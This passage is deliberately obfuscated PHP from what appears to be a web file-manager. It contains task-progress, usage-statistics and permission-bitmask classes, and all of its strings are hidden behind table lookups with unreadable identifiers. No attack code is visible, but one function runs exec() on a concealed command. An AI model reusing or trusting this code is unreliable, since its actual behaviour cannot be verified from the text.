$ó“‰ËÙ‘ * (1 - $îÏ—¾ñ[$˜‡İûí¢[1703]]) / $îÏ—¾ñ[$˜‡İûí¢[1703]]; } } public function copyFileStart($œ‰Ééåİ, $™€ìäò†, $•¼Í‚—¿, $ÇÇ³…¯, $Çä™¢’¯, $ÈÉ…Ã†Ô) { $ÍóŠá¯¤ =& $_SERVER[çâ¥×ø³]; parent::copyFileStart($œ‰Ééåİ, $™€ìäò†, $•¼Í‚—¿, $ÇÇ³…¯, $Çä™¢’¯, $ÈÉ…Ã†Ô); $®ŸØü÷û =& $this->task; if ($®ŸØü÷û[$ÍóŠá¯¤[1819]] == $ÍóŠá¯¤[357]) { $®ŸØü÷û[$ÍóŠá¯¤[1819]] = $ÍóŠá¯¤[107]; } $this->update(); } public function copyFileEnd($Õ‰¼€÷Š, $å™¶‚åº, $’«ŸÏ™, $¦–°ñ¿ğ, $ñõ»øé’, $ì÷½é€Î) { $ıõï¸›¥ =& $_SERVER[çâ¥×ø³]; $ÆÛÂöìâ =& $this->task; $ÆÛÂöìâ[$ıõï¸›¥[1755]] = $ÆÛÂöìâ[$ıõï¸›¥[1754]]; $ÆÛÂöìâ[$ıõï¸›¥[1759]] += $ÆÛÂöìâ[$ıõï¸›¥[1754]]; $ÆÛÂöìâ[$ıõï¸›¥[1756]] = $ıõï¸›¥[12]; $this->update(); } public function zipEvent($¿Ü··´¦, $Ô‰ë„¨á, $Õ³¦•¨, $ü¼µç¹Û) { $ıî™èô¿ =& $_SERVER[çâ¥×ø³]; $´¨Ê§´À =& $this->task; $´¨Ê§´À[$ıî™èô¿[1752]] = get_path_this($Ô‰ë„¨á); $´¨Ê§´À[$ıî™èô¿[1754]] = $ü¼µç¹Û; $´¨Ê§´À[$ıî™èô¿[1755]] = $Õ³¦•¨; $´¨Ê§´À[$ıî™èô¿[1117]] = $¿Ü··´¦ == $ıî™èô¿[1827] ? $ıî™èô¿[1822] : $ıî™èô¿[1823]; $´¨Ê§´À[$ıî™èô¿[1756]] = $ıî™èô¿[12]; $´¨Ê§´À[$ıî™èô¿[812]] = $ü¼µç¹Û; $´¨Ê§´À[$ıî™èô¿[1819]] = $ıî™èô¿[357]; $this->update(); } public function nameParse($‡şÀÌŒÜ) { $¨£ƒ¿Š =& $_SERVER[çâ¥×ø³]; $±¡’‚ù‘ =& $this->task; if ($±¡’‚ù‘[$¨£ƒ¿Š[1702]] < $±¡’‚ù‘[$¨£ƒ¿Š[835]]) { $¼’¾ŠÙ = get_path_this($‡şÀÌŒÜ); if (strstr($¼’¾ŠÙ, $¨£ƒ¿Š[10])) { $±¡’‚ù‘[$¨£ƒ¿Š[1702]] += 1; } } if ($±¡’‚ù‘[$¨£ƒ¿Š[1819]] == $¨£ƒ¿Š[1247]) { $±¡’‚ù‘[$¨£ƒ¿Š[1819]] = $¨£ƒ¿Š[357]; } $±¡’‚ù‘[$¨£ƒ¿Š[1752]] = $‡şÀÌŒÜ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¤…à˜¡ò) { $Û—ÅÅõ  =& $_SERVER[çâ¥×ø³]; $ß Ë¿ğ’ = array($Û—ÅÅõ [630] => array($Û—ÅÅõ [33] => $Û—ÅÅõ [1828], $Û—ÅÅõ [317] => array($Û—ÅÅõ [239], $Û—ÅÅõ [814], $Û—ÅÅõ [1829], $Û—ÅÅõ [1830])), $Û—ÅÅõ [1831] => array($Û—ÅÅõ [33] => $Û—ÅÅõ [1832], $Û—ÅÅõ [317] => array($Û—ÅÅõ [239], $Û—ÅÅõ [812], $Û—ÅÅõ [1833], $Û—ÅÅõ [1834], $Û—ÅÅõ [1835]))); if (!isset($ß Ë¿ğ’[$¤…à˜¡ò])) { return !1; } $this->optionType = $ß Ë¿ğ’[$¤…à˜¡ò][$Û—ÅÅõ [33]]; $this->field = $ß Ë¿ğ’[$¤…à˜¡ò][$Û—ÅÅõ [317]]; return !0; } public function listData($¨ùÛÍãª = false, $ÏíáÇ = "\155\x6f\x64\x69\146\x79\124\x69\x6d\145", $ïìùİ£‹ = false) { return parent::listData($¨ùÛÍãª, $ÏíáÇ, $ïìùİ£‹); } public function trendList($÷•Î·”°) { $¯ÛÙ¥†é =& $_SERVER[çâ¥×ø³]; $Ãªİ·ÅÑ = $this->listData(); if ($Ãªİ·ÅÑ) { $Õ¨±°ÍÜ = end($Ãªİ·ÅÑ); $ßÍÈ°‡Ù = date($¯ÛÙ¥†é[1836], strtotime($¯ÛÙ¥†é[1837])); if ($Õ¨±°ÍÜ[$¯ÛÙ¥†é[239]] == $ßÍÈ°‡Ù) { return $Ãªİ·ÅÑ; } $¬áîÛÜ„ = strtotime($Õ¨±°ÍÜ[$¯ÛÙ¥†é[239]]); } if (!isset($¬áîÛÜ„)) { $µ–­¤Ãğ = $÷•Î·”° == $¯ÛÙ¥†é[630] ? $¯ÛÙ¥†é[567] : $¯ÛÙ¥†é[874]; $¬áîÛÜ„ = Model($µ–­¤Ãğ)->min($¯ÛÙ¥†é[215]); } $•ïŞ‰  = $¯ÛÙ¥†é[1838] . ucfirst($÷•Î·”°); $â¨¶¥Ş© = $this->dateList($¬áîÛÜ„); foreach ($â¨¶¥Ş© as $ßÍÈ°‡Ù) { $this->{$•ïŞ‰ }($ßÍÈ°‡Ù); } return $this->listData(); } private function dateList($Ó§’Œ„) { $»Çàõ’¢ =& $_SERVER[çâ¥×ø³]; $Ïâ×€ç = $Ó§’Œ„; $—¥òÀî´ = strtotime($»Çàõ’¢[1837]); $‰Áß¢ú = array(); while ($Ïâ×€ç <= $—¥òÀî´) { $‰Áß¢ú[] = date($»Çàõ’¢[1836], $Ïâ×€ç); $Ïâ×€ç = strtotime($»Çàõ’¢[1839], $Ïâ×€ç); } return $‰Áß¢ú; } public function _recordUser($½‰ÃäÁ§ = '') { $²ÁÓÖş‚ =& $_SERVER[çâ¥×ø³]; $Ğ–áş = strtotime(date($²ÁÓÖş‚[1840], strtotime($½‰ÃäÁ§))); $öÙ‰èÙ = strtotime(date($²ÁÓÖş‚[1841], strtotime($½‰ÃäÁ§))); $Àï¾™œ = array($²ÁÓÖş‚[215] => array($²ÁÓÖş‚[1066], $öÙ‰èÙ)); $Ö¨Ç¹è = Model($²ÁÓÖş‚[567])->where($Àï¾™œ)->count($²ÁÓÖş‚[1701]); $Àï¾™œ[$²ÁÓÖş‚[215]] = array($²ÁÓÖş‚[377], array($Ğ–áş, $öÙ‰èÙ)); $£±ğä˜ = Model($²ÁÓÖş‚[567])->where($Àï¾™œ)->count($²ÁÓÖş‚[1701]); $Àï¾™œ[$²ÁÓÖş‚[33]] = $²ÁÓÖş‚[1842]; $íİ…õ»­ = Model($²ÁÓÖş‚[1843])->where($Àï¾™œ)->count($²ÁÓÖş‚[1844]); $…ô·¢© = array($²ÁÓÖş‚[239] => $½‰ÃäÁ§, $²ÁÓÖş‚[814] => (int) $Ö¨Ç¹è, $²ÁÓÖş‚[1829] => (int) $£±ğä˜, $²ÁÓÖş‚[1830] => (int) $íİ…õ»­); return $this->insert($…ô·¢©); } public function _recordStore($şÇû·Ø¯ = '') { $»´»¬Ğ =& $_SERVER[çâ¥×ø³]; $¨â¢Èè€ = strtotime(date($»´»¬Ğ[1841], strtotime($şÇû·Ø¯))); $¿ûÀÈ„Ğ = array($»´»¬Ğ[215] => array($»´»¬Ğ[1066], $¨â¢Èè€)); $ú˜ÜÖ«Ö = Model($»´»¬Ğ[512])->where($¿ûÀÈ„Ğ)->sum($»´»¬Ğ[76]); $¿ûÀÈ„Ğ[$»´»¬Ğ[453]] = 0; $Äšúø…ù = Model($»´»¬Ğ[874])->where($¿ûÀÈ„Ğ)->sum($»´»¬Ğ[76]); $¿ûÀÈ„Ğ[$»´»¬Ğ[178]] = 1; $Üâ™ö½Ç = Model($»´»¬Ğ[874])->where($¿ûÀÈ„Ğ)->sum($»´»¬Ğ[76]); $¿ûÀÈ„Ğ[$»´»¬Ğ[178]] = 2; $ùÓ›úÊÌ = Model($»´»¬Ğ[874])->where($¿ûÀÈ„Ğ)->sum($»´»¬Ğ[76]); $®ë…‹¢ğ = array($»´»¬Ğ[239] => $şÇû·Ø¯, $»´»¬Ğ[812] => (int) $Äšúø…ù, $»´»¬Ğ[1833] => (int) $ú˜ÜÖ«Ö, $»´»¬Ğ[1834] => (int) $Üâ™ö½Ç, $»´»¬Ğ[1835] => (int) $ùÓ›úÊÌ); return $this->insert($®ë…‹¢ğ); } public function trend($ˆÃ´ò¯š, $ôòŠ°¤Ê) { $ëÖªË¦ =& $_SERVER[çâ¥×ø³]; if (!$this->init($ˆÃ´ò¯š)) { return !1; } $ªààşøî = $this->trendList($ˆÃ´ò¯š); if ($ªààşøî && $ôòŠ°¤Ê != $ëÖªË¦[1674]) { $Ë˜Ÿ“Ï² = $ªààşøî[0][$ëÖªË¦[239]]; $íù€Ê ® = $this->validDate($ôòŠ°¤Ê, $Ë˜Ÿ“Ï²); $ˆúŠ€û­ = array(); $£Ç½œ¾€ = array_to_keyvalue($ªààşøî, $ëÖªË¦[239]); foreach ($íù€Ê ® as $îîÖÖ‰İ) { if (isset($£Ç½œ¾€[$îîÖÖ‰İ])) { $¡†í³‘… = $£Ç½œ¾€[$îîÖÖ‰İ]; } else { $¡†í³‘… = end($ªààşøî); $¡†í³‘…[$ëÖªË¦[239]] = $îîÖÖ‰İ; if ($ˆÃ´ò¯š == $ëÖªË¦[630]) { $¡†í³‘…[$ëÖªË¦[1829]] = $¡†í³‘…[$ëÖªË¦[1830]] = 0; } } $ˆúŠ€û­[] = $¡†í³‘…; } $ªààşøî = $ˆúŠ€û­; } $«æÏÅ÷º = array($ëÖªË¦[630] => array($ëÖªË¦[814] => LNG($ëÖªË¦[1845]), $ëÖªË¦[1829] => LNG($ëÖªË¦[1846]), $ëÖªË¦[1830] => LNG($ëÖªË¦[1847])), $ëÖªË¦[1831] => array($ëÖªË¦[812] => LNG($ëÖªË¦[1848]), $ëÖªË¦[1833] => LNG($ëÖªË¦[1849]), $ëÖªË¦[1834] => LNG($ëÖªË¦[1850]), $ëÖªË¦[1835] => LNG($ëÖªË¦[1851]))); $Ğ…Æˆ­ş = array($ëÖªË¦[630] => $ëÖªË¦[1852], $ëÖªË¦[1831] => $ëÖªË¦[76]); if (empty($ªààşøî)) { $îîÖÖ‰İ = date($ëÖªË¦[1836], strtotime($ëÖªË¦[1837])); $³Ëİ«Š = array($ëÖªË¦[239] => $îîÖÖ‰İ); foreach ($«æÏÅ÷º[$ˆÃ´ò¯š] as $—“¬äø => $Î‘Œ•İ) { $³Ëİ«Š[$—“¬äø] = 0; } $ªààşøî[] = $³Ëİ«Š; } $“–÷–·Š = array(); foreach ($ªààşøî as $Î‘Œ•İ) { if ($ˆÃ´ò¯š == $ëÖªË¦[1831] && $Î‘Œ•İ[$ëÖªË¦[1833]] > $Î‘Œ•İ[$ëÖªË¦[812]]) { $Î‘Œ•İ[$ëÖªË¦[1833]] = $Î‘Œ•İ[$ëÖªË¦[812]]; } foreach ($«æÏÅ÷º[$ˆÃ´ò¯š] as $—“¬äø => $ìàòÎ«ó) { $¡†í³‘… = array($ëÖªË¦[239] => $Î‘Œ•İ[$ëÖªË¦[239]], $ëÖªË¦[1598] => $ìàòÎ«ó); $¡†í³‘…[$Ğ…Æˆ­ş[$ˆÃ´ò¯š]] = isset($Î‘Œ•İ[$—“¬äø]) ? $Î‘Œ•İ[$—“¬äø] : 0; $“–÷–·Š[] = $¡†í³‘…; } } return $“–÷–·Š; } public function validDate($„É€öÅâ, $¯ûûÔÉ¼) { $øò‡ò¥Ï =& $_SERVER[çâ¥×ø³]; $Üóñô’¸ = date($øò‡ò¥Ï[1836], strtotime($øò‡ò¥Ï[1837])); $ùÀ˜…Úó = array($Üóñô’¸); switch ($„É€öÅâ) { case $øò‡ò¥Ï[1681]: $óîÔ“ö = mktime(0, 0, 0, date($øò‡ò¥Ï[1853]), date($øò‡ò¥Ï[1413]) - date($øò‡ò¥Ï[1476]) + 7 - 7, date($øò‡ò¥Ï[1854])); $øÉ¹¬Î = 0; do { $àúµ–Á¿ = date($øò‡ò¥Ï[1836], $óîÔ“ö - 3600 * 24 * 7 * $øÉ¹¬Î); $ùÀ˜…Úó[] = $àúµ–Á¿; $øÉ¹¬Î++; } while ($¯ûûÔÉ¼ < $àúµ–Á¿); break; case $øò‡ò¥Ï[1679]: $øÉ¹¬Î = 1; do { $’ÑÎçŠƒ = date($øò‡ò¥Ï[1855], strtotime("\x2d\40{$øÉ¹¬Î}\40\x6d\157\x6e\164\150\x73")); $ùÀ˜…Úó[] = $’ÑÎçŠƒ; $øÉ¹¬Î++; } while ($¯ûûÔÉ¼ < $’ÑÎçŠƒ); break; case $øò‡ò¥Ï[1856]: $éöª³ŸË = (int) date($øò‡ò¥Ï[1854], strtotime($¯ûûÔÉ¼)); $Š©ÒßÅ = (int) date($øò‡ò¥Ï[1854]); if ($éöª³ŸË >= $Š©ÒßÅ) { break; } for ($éöª³ŸË; $éöª³ŸË < $Š©ÒßÅ; $éöª³ŸË++) { $ùÀ˜…Úó[] = $éöª³ŸË . $øò‡ò¥Ï[1857]; } break; default: break; } if ($¯ûûÔÉ¼ > end($ùÀ˜…Úó)) { array_pop($ùÀ˜…Úó); } sort($ùÀ˜…Úó); return $ùÀ˜…Úó; } public function listTable($‰±Ó‘ŸÅ) { $æüÅ†¼Ã = ucfirst($‰±Ó‘ŸÅ); return Model($æüÅ†¼Ã)->listData(); } public function option($â‡º¸½ã) { $¦¸“±ó = $_SERVER[çâ¥×ø³][1858] . ucfirst($â‡º¸½ã); return $this->{$¦¸“±ó}(); } private function optionUser() { $§—‚ÔŠş =& $_SERVER[çâ¥×ø³]; $áª²À²¸ = Model($§—‚ÔŠş[567])->count($§—‚ÔŠş[1701]); $ÎôíÛç¼ = Model($§—‚ÔŠş[567])->where($§—‚ÔŠş[1859])->count($§—‚ÔŠş[1701]); $¿¬¶¿ = intval($GLOBALS[$§—‚ÔŠş[6]][$§—‚ÔŠş[393]][$§—‚ÔŠş[1653]]) / 3600; $¿¯Ú• = strtotime("\x2d{$¿¬¶¿}\x20\x68\157\165\x72\163"); $ñ’ø …× = strtotime(date($§—‚ÔŠş[1840])); if ($¿¯Ú• < $ñ’ø …×) { $¿¯Ú• = $ñ’ø …×; } $È…«½·º = array($§—‚ÔŠş[1860] => array($§—‚ÔŠş[1067], $¿¯Ú•)); $ÈÃñÈ = (int) Model($§—‚ÔŠş[567])->where($È…«½·º)->count($§—‚ÔŠş[1701]); if (!$ÈÃñÈ) { $ÈÃñÈ = 1; } $È…«½·º = array($§—‚ÔŠş[1860] => array($§—‚ÔŠş[1067], $ñ’ø …×)); $Ù•şî¼— = Model($§—‚ÔŠş[567])->where($È…«½·º)->count($§—‚ÔŠş[1701]); return array($§—‚ÔŠş[807] => (int) $áª²À²¸, $§—‚ÔŠş[1861] => (int) ($áª²À²¸ - $ÎôíÛç¼), $§—‚ÔŠş[1862] => (int) $ÎôíÛç¼, $§—‚ÔŠş[1863] => (int) $Ù•şî¼—, $§—‚ÔŠş[1864] => $ÈÃñÈ); } private function optionFile() { $¶¬á³äî =& $_SERVER[çâ¥×ø³]; $ıÃÀã÷Õ = $this->sourceSize(); $…‹Å®Ğ… = $ıÃÀã÷Õ[$¶¬á³äî[76]]; $ğÕ–±© = $ıÃÀã÷Õ[$¶¬á³äî[1833]]; $×è¼§­â = Model($¶¬á³äî[874])->where(array($¶¬á³äî[453] => 0))->count($¶¬á³äî[181]); $êÃóÇç‡ = array($¶¬á³äî[453] => 0, $¶¬á³äî[215] => array($¶¬á³äî[1067], strtotime(date($¶¬á³äî[1840])))); $ƒ“˜¦ñ = Model($¶¬á³äî[874])->where($êÃóÇç‡)->sum($¶¬á³äî[76]); $Äó”¡ÛÌ = Model($¶¬á³äî[874])->where($êÃóÇç‡)->count($¶¬á³äî[181]); return array($¶¬á³äî[812] => $…‹Å®Ğ…, $¶¬á³äî[1833] => $ğÕ–±©, $¶¬á³äî[1865] => $…‹Å®Ğ… - $ğÕ–±©, $¶¬á³äî[1866] => (int) $ƒ“˜¦ñ, $¶¬á³äî[814] => (int) $×è¼§­â, $¶¬á³äî[1867] => (int) $Äó”¡ÛÌ); } private function optionAccess() { $Ü“‡úâ˜ =& $_SERVER[çâ¥×ø³]; return array($Ü“‡úâ˜[807] => $this->typeLogCnt(), $Ü“‡úâ˜[107] => $this->typeLogCnt($Ü“‡úâ˜[107]), $Ü“‡úâ˜[493] => $this->typeLogCnt($Ü“‡úâ˜[493]), $Ü“‡úâ˜[1868] => $this->typeLogCnt($Ü“‡úâ˜[1868]), $Ü“‡úâ˜[1869] => $this->typeLogCnt($Ü“‡úâ˜[1869]), $Ü“‡úâ˜[630] => $this->typeLogCnt($Ü“‡úâ˜[12], $Ü“‡úâ˜[1844])); } private function typeLogCnt($ÔæÕøÌî = '', $¯ŞÍè† = "\x69\144") { $Ãè¦ó·Õ =& $_SERVER[çâ¥×ø³]; $›¦öÍÒ¿ = array($Ãè¦ó·Õ[107] => array($Ãè¦ó·Õ[1870], $Ãè¦ó·Õ[1871]), $Ãè¦ó·Õ[493] => array($Ãè¦ó·Õ[1872], $Ãè¦ó·Õ[1873]), $Ãè¦ó·Õ[1868] => array($Ãè¦ó·Õ[1874], $Ãè¦ó·Õ[1875], $Ãè¦ó·Õ[1876]), $Ãè¦ó·Õ[1869] => array($Ãè¦ó·Õ[1877], $Ãè¦ó·Õ[1878]), $Ãè¦ó·Õ[1879] => array($Ãè¦ó·Õ[1880], $Ãè¦ó·Õ[1881], $Ãè¦ó·Õ[1882])); $ş‘ë²® = strtotime(date($Ãè¦ó·Õ[1840])); $‹õ£¾šõ = array($Ãè¦ó·Õ[215] => array($Ãè¦ó·Õ[1067], $ş‘ë²®)); if ($ÔæÕøÌî) { $‹õ£¾šõ[$Ãè¦ó·Õ[33]] = array($Ãè¦ó·Õ[7], $›¦öÍÒ¿[$ÔæÕøÌî]); } $ñ™¬¥Áª = Model($Ãè¦ó·Õ[1843])->where($‹õ£¾šõ)->count($¯ŞÍè†); return (int) $ñ™¬¥Áª; } private function optionServer() { $“„àçëñ =& $_SERVER[çâ¥×ø³]; $üª…æˆ¼ = $this->diskDriver(); $´˜ñ´²È = KodIO::defaultDriver(); $úôõ’¶ş = array($“„àçëñ[866] => $´˜ñ´²È[$“„àçëñ[443]]); $—ÚÌ’æè = Model($“„àçëñ[512])->where($úôõ’¶ş)->sum($“„àçëñ[76]); $²ü¯›ôÊ = explode($“„àçëñ[53], $_SERVER[$“„àçëñ[144]]); $ä‡±ØßÂ = $²ü¯›ôÊ[0]; $ŠÜèŸ÷ = $GLOBALS[$“„àçëñ[6]][$“„àçëñ[21]]; $ëÍ¢’¦ = $ŠÜèŸ÷[$“„àçëñ[1029]]; if ($ëÍ¢’¦ == $“„àçëñ[1017]) { $ù½…Á = explode($“„àçëñ[1335], $ŠÜèŸ÷[$“„àçëñ[1028]]); $ëÍ¢’¦ = $ù½…Á[0]; } if ($ëÍ¢’¦ == $“„àçëñ[965] || $ëÍ¢’¦ == $“„àçëñ[853]) { $÷ˆ¯å™ = Model()->db()->query($“„àçëñ[1883]); $ÖÜáßØÌ = $÷ˆ¯å™[0] && isset($÷ˆ¯å™[0][$“„àçëñ[1597]]) ? $÷ˆ¯å™[0][$“„àçëñ[1597]] : 0; $ëÍ¢’¦ = $“„àçëñ[1884] . ($ÖÜáßØÌ ? $“„àçëñ[8] . $ÖÜáßØÌ : $“„àçëñ[12]); } $‰Éä­¹Ç = $GLOBALS[$“„àçëñ[6]][$“„àçëñ[393]][$“„àçëñ[876]]; return array($“„àçëñ[1885] => $üª…æˆ¼ ? $üª…æˆ¼[$“„àçëñ[1886]] : 0, $“„àçëñ[1887] => $üª…æˆ¼ ? $üª…æˆ¼[$“„àçëñ[1888]] : 0, $“„àçëñ[1889] => (int) $´˜ñ´²È[$“„àçëñ[1886]] * 1024 * 1024 * 1024, $“„àçëñ[1890] => (int) $—ÚÌ’æè, $“„àçëñ[1891] => ucfirst($ä‡±ØßÂ), $“„àçëñ[1892] => $“„àçëñ[1893] . PHP_VERSION, $“„àçëñ[1894] => phpBuild64() ? 64 : 32, $“„àçëñ[806] => str_replace($“„àçëñ[1183], $“„àçëñ[1045], $ëÍ¢’¦), $“„àçëñ[393] => ucfirst($‰Éä­¹Ç), $“„àçëñ[32] => $_SERVER[$“„àçëñ[1895]]); } private function diskDriver() { $æäøÅ—‰ =& $_SERVER[çâ¥×ø³]; $—³‘Îğ = $æäøÅ—‰[8]; $Ã®áĞ•É = $GLOBALS[$æäøÅ—‰[6]][$æäøÅ—‰[1352]] == $æäøÅ—‰[1353]; if ($Ã®áĞ•É) { $—³‘Îğ = $æäøÅ—‰[1896]; if (function_exists($æäøÅ—‰[1897])) { exec($æäøÅ—‰[1898], $ñöÌ‰Úˆ); $—³‘Îğ = $ñöÌ‰Úˆ[1] . $æäøÅ—‰[8]; } } if (!file_exists($—³‘Îğ)) { return; } $™±É…îò = @disk_total_space($—³‘Îğ); $âóÓØ¹Ù = $™±É…îò - @disk_free_space($—³‘Îğ); return array($æäøÅ—‰[1886] => $™±É…îò, $æäøÅ—‰[1888] => $âóÓØ¹Ù); } public function fileChart($˜Å‚ëš‡) { $ã©ôâĞğ =& $_SERVER[çâ¥×ø³]; if (isset($˜Å‚ëš‡[$ã©ôâĞğ[1701]])) { return Model($ã©ôâĞğ[874])->userFileTypeProfile($˜Å‚ëš‡[$ã©ôâĞğ[1701]]); } if (isset($˜Å‚ëš‡[$ã©ôâĞğ[1899]])) { return Model($ã©ôâĞğ[874])->groupFileTypeProfile($˜Å‚ëš‡[$ã©ôâĞğ[1899]]); } $ˆ†Œ•Ç¾ = $this->sourceSize(); $£Â’Á× = array($ã©ôâĞğ[180] => 0, $ã©ôâĞğ[178] => 1); $ÊŒÇË¹¼ = Model($ã©ôâĞğ[874])->where($£Â’Á×)->sum($ã©ôâĞğ[76]); $£Â’Á×[$ã©ôâĞğ[178]] = 2; $çñˆ‡®Ş = Model($ã©ôâĞğ[874])->where($£Â’Á×)->sum($ã©ôâĞğ[76]); return array($ã©ôâĞğ[812] => $ˆ†Œ•Ç¾[$ã©ôâĞğ[76]], $ã©ôâĞğ[1833] => $ˆ†Œ•Ç¾[$ã©ôâĞğ[1833]], $ã©ôâĞğ[1834] => (int) $ÊŒÇË¹¼, $ã©ôâĞğ[1835] => (int) $çñˆ‡®Ş); } private function sourceSize() { $‰Òå¶Áí =& $_SERVER[çâ¥×ø³]; $ñ¸º‘ç¥ = Model($‰Òå¶Áí[874])->where(array($‰Òå¶Áí[453] => 0))->sum($‰Òå¶Áí[76]); $øäåËÕ = Model($‰Òå¶Áí[512])->sum($‰Òå¶Áí[76]); if ($øäåËÕ > $ñ¸º‘ç¥) { $øäåËÕ = $ñ¸º‘ç¥; } return array($‰Òå¶Áí[76] => (int) $ñ¸º‘ç¥, $‰Òå¶Áí[1833] => (int) $øäåËÕ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¨±˜‚Á¡ =& $_SERVER[çâ¥×ø³]; $×°Îş¤— = array(array($¨±˜‚Á¡[462] => LNG($¨±˜‚Á¡[1900]), $¨±˜‚Á¡[1901] => $¨±˜‚Á¡[1902], $¨±˜‚Á¡[1903] => 1, $¨±˜‚Á¡[1904] => 1, $¨±˜‚Á¡[1905] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨±˜‚Á¡[462] => LNG($¨±˜‚Á¡[1906]), $¨±˜‚Á¡[1901] => $¨±˜‚Á¡[1907], $¨±˜‚Á¡[1903] => 2, $¨±˜‚Á¡[1904] => 1, $¨±˜‚Á¡[1905] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨±˜‚Á¡[462] => LNG($¨±˜‚Á¡[1908]), $¨±˜‚Á¡[1901] => $¨±˜‚Á¡[1909], $¨±˜‚Á¡[1903] => 3, $¨±˜‚Á¡[1904] => 1, $¨±˜‚Á¡[1905] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨±˜‚Á¡[462] => LNG($¨±˜‚Á¡[1910]), $¨±˜‚Á¡[1901] => $¨±˜‚Á¡[1911], $¨±˜‚Á¡[1903] => 4, $¨±˜‚Á¡[1904] => 1, $¨±˜‚Á¡[1905] => self::AUTH_SHOW | self::AUTH_VIEW), array($¨±˜‚Á¡[462] => LNG($¨±˜‚Á¡[1912]), $¨±˜‚Á¡[1901] => $¨±˜‚Á¡[1913], $¨±˜‚Á¡[1903] => 5, $¨±˜‚Á¡[1904] => 1, $¨±˜‚Á¡[1905] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¨±˜‚Á¡[462] => LNG($¨±˜‚Á¡[1914]), $¨±˜‚Á¡[1901] => $¨±˜‚Á¡[1915], $¨±˜‚Á¡[1903] => 6, $¨±˜‚Á¡[1904] => 1, $¨±˜‚Á¡[1905] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¨±˜‚Á¡[462] => LNG($¨±˜‚Á¡[1916]), $¨±˜‚Á¡[1901] => $¨±˜‚Á¡[1917], $¨±˜‚Á¡[1903] => 7, $¨±˜‚Á¡[1904] => 1, $¨±˜‚Á¡[1905] => 0)); return $×°Îş¤—; } public static function authCheck($ñä­½Ëš, $¥¾‰é¾©) { $£ßö¶Âä =& $_SERVER[çâ¥×ø³]; $ñä­½Ëš = intval($ñä­½Ëš); if ($GLOBALS[$£ßö¶Âä[536]] && $GLOBALS[$£ßö¶Âä[6]][$£ßö¶Âä[1918]]) { return !0; } if ($ñä­½Ëš <= 0) { return !1; } if (($ñä­½Ëš & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ñä­½Ëš & $¥¾‰é¾©); } public static function authCheckShow($œŒ”„ä) { return self::authCheck($œŒ”„ä, self::AUTH_SHOW); } public static function authCheckView($å¸›©¡) { return self::authCheck($å¸›©¡, self::AUTH_VIEW); } public static function authCheckDownload($ÁÖ«Œíû) { return self::authCheck($ÁÖ«Œíû, self::AUTH_DOWNLOAD); } public static function authCheckUpload($øóŒ£ú) { return self::authCheck($øóŒ£ú, self::AUTH_UPLOAD); } public static function authCheckEdit($ãÅ¬º‘Ì) { return self::authCheck($ãÅ¬º‘Ì, self::AUTH_EDIT); } public static function authCheckRemove($”ª¶ş½) { return self::authCheck($”ª¶ş½, self::AUTH_REMOVE); } public static function authCheckShare($¼‚›±·Ä) { return self::authCheck($¼‚›±·Ä, self::AUTH_SHARE); } public static function authCheckComment($Æ»èì©¬) { return self::authCheck($Æ»èì©¬, self::AUTH_COMMENT); } public static function authCheckEvent($£ï†©û§) { return self::authCheck($£ï†©û§, self::AUTH_EVENT); } public static function authCheckRoot($¤ğşãĞ¦) { return self::authCheck($¤ğşãĞ¦, self::AUTH_ROOT); } public static function authCheckAction($ñòº±µ¦, $É”æÈÒÛ) { $Ù¨ğï– =& $_SERVER[çâ¥×ø³]; $ºş›«ñ = array($Ù¨ğï–[1919] => self::AUTH_VIEW, $Ù¨ğï–[1247] => self::AUTH_DOWNLOAD, $Ù¨ğï–[107] => self::AUTH_UPLOAD, $Ù¨ğï–[1869] => self::AUTH_EDIT, $Ù¨ğï–[1868] => self::AUTH_REMOVE, $Ù¨ğï–[1879] => self::AUTH_SHARE, $Ù¨ğï–[398] => self::AUTH_COMMENT, $Ù¨ğï–[1689] => self::AUTH_EVENT, $Ù¨ğï–[1920] => self::AUTH_ROOT); if (!isset($ºş›«ñ[$É”æÈÒÛ])) { return; } $çêµ·¨‹ = $ºş›«ñ[$É”æÈÒÛ]; $ñòº±µ¦ = intval($ñòº±µ¦); if ($ñòº±µ¦ <= 0) { return !1; } if (($ñòº±µ¦ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ñòº±µ¦ & $çêµ·¨‹); } public static function authDisable($¤ÁÉ¼»Ë, $›‘à€ıÁ) { if (intval($¤ÁÉ¼»Ë) <= 0) { return 0; } return intval($¤ÁÉ¼»Ë) & ~$›‘à€ıÁ; } public $optionType = "\123\x79\x73\164\x65\x6d\56\163\157\165\x72\143\145\101\x75\164\x68\x4c\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\141\165\164\150", "\x6c\141\142\145\x6c", "\x64\151\163\160\x6c\x61\x79", "\163\x79\163\164\145\x6d", "\163\x6f\x72\164"); public function initData() { $§ŸğÎ”Ü = $this->authDefault(); foreach ($§ŸğÎ”Ü as $•£¿²çß) { $this->add($•£¿²çß); } } public function findAuth($ìñ¶ª±‚, $·âø·”„) { $€ªÑŞ¥ø =& $_SERVER[çâ¥×ø³]; 